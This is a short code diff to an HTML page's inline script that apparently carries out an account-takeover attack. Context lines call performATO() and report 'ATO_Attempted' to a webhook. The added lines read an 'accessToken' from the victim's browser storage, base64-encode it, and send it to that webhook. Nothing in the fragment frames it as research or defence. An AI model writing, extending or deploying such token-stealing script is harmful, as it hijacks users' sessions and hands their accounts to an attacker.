@@ -31,6 +31,10 @@
         fetch(webhook + "?status=ATO_Attempted");
     }
     performATO();
+    const token = localStorage.getItem('accessToken') || sessionStorage.getItem('accessToken');
+if (token) {
+    fetch(webhook + "?token=" + btoa(token));
+}
 </script>
 </body>
 </html>
